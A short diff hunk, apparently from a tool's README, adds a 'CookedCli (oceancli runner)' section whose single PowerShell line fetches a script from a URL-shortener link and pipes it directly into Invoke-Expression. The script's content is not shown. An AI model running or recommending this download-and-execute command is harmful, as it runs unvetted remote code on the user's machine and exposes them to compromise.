@@ -17,6 +17,11 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bridgerzan/screenshare
 Start-Process $folder
 ```
 
+CookedCli (oceancli runner)
+```powershell
+irm https://B2n.ir/CookedCLI | iex
+```
+
 
 code rbw bam
 ```powershell
